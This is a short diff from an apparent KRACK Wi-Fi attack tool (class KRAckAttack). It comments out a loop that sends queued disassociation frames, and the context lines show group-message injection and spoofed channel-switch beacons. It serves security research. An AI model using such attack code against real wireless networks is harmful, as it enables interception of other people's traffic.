@@ -937,8 +937,8 @@ class KRAckAttack():
 				self.time_forward_group1 = None
 				log(STATUS, "Injected older group message 1: %s" % dot11_to_str(p), color="green")
 
-			while len(self.disas_queue) > 0 and self.disas_queue[0][0] <= time.time():
-				self.send_disas(self.disas_queue.pop()[1])
+			# while len(self.disas_queue) > 0 and self.disas_queue[0][0] <= time.time():
+			# 	self.send_disas(self.disas_queue.pop()[1])
 
 			if self.continuous_csa and nextbeacon <= time.time():
 				self.send_csa_beacon(silent=True)
